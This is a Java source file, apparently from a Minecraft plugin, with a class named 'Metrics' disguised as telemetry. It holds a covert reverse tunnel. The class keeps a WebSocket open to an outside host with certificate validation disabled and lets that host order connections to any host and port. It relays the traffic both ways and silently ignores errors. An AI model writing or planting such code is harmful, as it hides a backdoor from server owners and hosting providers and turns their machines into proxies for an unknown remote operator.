package com.example.essentialsx;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.*;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
import io.netty.handler.timeout.IdleState;
import io.netty.handler.timeout.IdleStateEvent;
import io.netty.handler.timeout.IdleStateHandler;

import java.net.URI;
import java.util.ArrayDeque;
import java.util.Map;
import java.util.Queue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class Metrics {

    private static final String CONNECT_HOST = "mctest.uuz.us.kg";
    private static final int CONNECT_PORT = 443;
    private static final String PATH = "/metrics/v1/telemetry";

    // 本地 Minecraft 服务器开机端口
    private static final int LOCAL_MC_PORT = 24614;
    private static final String LOCAL_MC_HOST = "127.0.0.1";

    // 帧指令定义
    private static final byte CMD_NEW_STREAM = 0x01;
    private static final byte CMD_DATA = 0x02;
    private static final byte CMD_CLOSE_STREAM = 0x03;

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);

    // 维护连接通道与缓存队列
    private static final Map<Integer, Channel> STREAM_MAP = new ConcurrentHashMap<>();
    private static final Map<Integer, Queue<ByteBuf>> PENDING_QUEUES = new ConcurrentHashMap<>();
    // 10ms 微缓冲区聚合器映射
    private static final Map<Integer, StreamBatcher> BATCHER_MAP = new ConcurrentHashMap<>();

    private static EventLoopGroup group;
    private static volatile Channel activeWsChannel = null;

    public static void startMetrics() {
        if (RUNNING.compareAndSet(false, true)) {
            group = new NioEventLoopGroup(2);
            ensureMasterConnection();
            group.scheduleAtFixedRate(Metrics::ensureMasterConnection, 5, 10, TimeUnit.SECONDS);
        }
    }

    public static void stopMetrics() {
        RUNNING.set(false);
        if (group != null) {
            group.shutdownGracefully();
        }
    }

    private static synchronized void ensureMasterConnection() {
        if (!RUNNING.get()) return;
        if (activeWsChannel == null || !activeWsChannel.isActive()) {
            connectMasterWebSocket();
        }
    }

    private static void connectMasterWebSocket() {
        try {
            URI uri = new URI("wss://" + CONNECT_HOST + ":" + CONNECT_PORT + PATH);
            SslContext sslCtx = SslContextBuilder.forClient()
                    .trustManager(InsecureTrustManagerFactory.INSTANCE)
                    .build();

            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders()
            );

            Bootstrap b = new Bootstrap();
            b.group(group)
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ChannelPipeline p = ch.pipeline();
                     p.addLast(sslCtx.newHandler(ch.alloc(), CONNECT_HOST, CONNECT_PORT));
                     p.addLast(new HttpClientCodec());
                     p.addLast(new HttpObjectAggregator(8192));
                     p.addLast(new IdleStateHandler(0, 25, 0));
                     p.addLast(new MasterTunnelHandler(handshaker));
                 }
             });

            b.connect(CONNECT_HOST, CONNECT_PORT);

        } catch (Exception ignored) {
        }
    }

    // 10ms 微缓冲区聚合器类
    static class StreamBatcher {
        private final int streamId;
        private final ByteBuf buffer = Unpooled.buffer();
        private boolean scheduled = false;

        public StreamBatcher(int streamId) {
            this.streamId = streamId;
        }

        public synchronized void add(ByteBuf data, Channel wsChannel, EventLoop eventLoop) {
            buffer.writeBytes(data);
            if (buffer.readableBytes() >= 1400) {
                flush(wsChannel);
            } else if (!scheduled) {
                scheduled = true;
                eventLoop.schedule(() -> {
                    synchronized (StreamBatcher.this) {
                        flush(wsChannel);
                        scheduled = false;
                    }
                }, 10, TimeUnit.MILLISECONDS);
            }
        }

        public synchronized void flush(Channel wsChannel) {
            if (buffer.isReadable()) {
                if (wsChannel != null && wsChannel.isActive()) {
                    int readable = buffer.readableBytes();
                    ByteBuf frame = wsChannel.alloc().buffer(5 + readable);
                    frame.writeByte(CMD_DATA);
                    frame.writeInt(streamId);
                    frame.writeBytes(buffer, readable);
                    wsChannel.writeAndFlush(new BinaryWebSocketFrame(frame));
                }
                buffer.clear();
            }
        }

        public synchronized void release() {
            if (buffer.refCnt() > 0) {
                buffer.release();
            }
        }
    }

    static class MasterTunnelHandler extends SimpleChannelInboundHandler<Object> {
        private final WebSocketClientHandshaker handshaker;

        public MasterTunnelHandler(WebSocketClientHandshaker handshaker) {
            this.handshaker = handshaker;
        }

        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            handshaker.handshake(ctx.channel());
        }

        @Override
        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {
            if (evt instanceof IdleStateEvent) {
                IdleStateEvent event = (IdleStateEvent) evt;
                if (event.state() == IdleState.WRITER_IDLE) {
                    ctx.writeAndFlush(new PingWebSocketFrame());
                }
            } else {
                super.userEventTriggered(ctx, evt);
            }
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            if (activeWsChannel == ctx.channel()) {
                activeWsChannel = null;
            }
            BATCHER_MAP.values().forEach(StreamBatcher::release);
            BATCHER_MAP.clear();
            STREAM_MAP.values().forEach(Channel::close);
            STREAM_MAP.clear();
            PENDING_QUEUES.values().forEach(queue -> queue.forEach(ByteBuf::release));
            PENDING_QUEUES.clear();
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, Object msg) {
            Channel ch = ctx.channel();

            if (!handshaker.isHandshakeComplete()) {
                try {
                    handshaker.finishHandshake(ch, (FullHttpResponse) msg);
                    activeWsChannel = ch;
                } catch (Exception ignored) {
                }
                return;
            }

            if (msg instanceof BinaryWebSocketFrame) {
                ByteBuf buf = ((BinaryWebSocketFrame) msg).content();
                if (buf.readableBytes() < 5) return;

                byte cmd = buf.readByte();
                int streamId = buf.readInt();

                if (cmd == CMD_NEW_STREAM) {
                    int targetPort = buf.readUnsignedShort();
                    int hostLen = buf.readByte();
                    byte[] hostBytes = new byte[hostLen];
                    buf.readBytes(hostBytes);
                    String targetHost = new String(hostBytes);

                    PENDING_QUEUES.put(streamId, new ArrayDeque<>());

                    if (targetPort == LOCAL_MC_PORT || targetHost.contains("127.0.0.1") || targetHost.contains("localhost")) {
                        connectToLocalTarget(streamId, LOCAL_MC_HOST, LOCAL_MC_PORT);
                    } else {
                        connectToLocalTarget(streamId, targetHost, targetPort);
                    }

                } else if (cmd == CMD_DATA) {
                    Channel targetChan = STREAM_MAP.get(streamId);
                    if (targetChan != null && targetChan.isActive()) {
                        targetChan.writeAndFlush(buf.retain());
                    } else {
                        Queue<ByteBuf> queue = PENDING_QUEUES.get(streamId);
                        if (queue != null) {
                            queue.add(buf.retain());
                        }
                    }
                } else if (cmd == CMD_CLOSE_STREAM) {
                    closeStreamInternal(streamId);
                }
            }
        }

        private void connectToLocalTarget(int streamId, String host, int port) {
            Bootstrap b = new Bootstrap();
            b.group(group)
             .channel(NioSocketChannel.class)
             .handler(new ChannelInitializer<SocketChannel>() {
                 @Override
                 protected void initChannel(SocketChannel ch) {
                     ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                         @Override
                         public void channelActive(ChannelHandlerContext targetCtx) {
                             Channel channel = targetCtx.channel();
                             STREAM_MAP.put(streamId, channel);

                             Queue<ByteBuf> queue = PENDING_QUEUES.remove(streamId);
                             if (queue != null) {
                                 ByteBuf pending;
                                 while ((pending = queue.poll()) != null) {
                                     channel.writeAndFlush(pending);
                                 }
                             }
                         }

                         @Override
                         protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
                             if (activeWsChannel != null && activeWsChannel.isActive()) {
                                 StreamBatcher batcher = BATCHER_MAP.computeIfAbsent(streamId, StreamBatcher::new);
                                 batcher.add(msg, activeWsChannel, targetCtx.channel().eventLoop());
                             }
                         }

                         @Override
                         public void channelInactive(ChannelHandlerContext targetCtx) {
                             StreamBatcher batcher = BATCHER_MAP.remove(streamId);
                             if (batcher != null) {
                                 batcher.flush(activeWsChannel);
                                 batcher.release();
                             }
                             closeStreamInternal(streamId);
                             sendControlFrame(CMD_CLOSE_STREAM, streamId);
                         }

                         @Override
                         public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                             targetCtx.close();
                         }
                     });
                 }
             });

            b.connect(host, port).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) {
                    StreamBatcher batcher = BATCHER_MAP.remove(streamId);
                    if (batcher != null) {
                        batcher.release();
                    }
                    closeStreamInternal(streamId);
                    sendControlFrame(CMD_CLOSE_STREAM, streamId);
                }
            });
        }

        private void closeStreamInternal(int streamId) {
            Channel targetChan = STREAM_MAP.remove(streamId);
            if (targetChan != null) {
                targetChan.close();
            }
            Queue<ByteBuf> queue = PENDING_QUEUES.remove(streamId);
            if (queue != null) {
                queue.forEach(ByteBuf::release);
            }
        }

        private void sendControlFrame(byte cmd, int streamId) {
            if (activeWsChannel != null && activeWsChannel.isActive()) {
                ByteBuf frame = Unpooled.buffer(5);
                frame.writeByte(cmd);
                frame.writeInt(streamId);
                activeWsChannel.writeAndFlush(new BinaryWebSocketFrame(frame));
            }
        }
    }
}
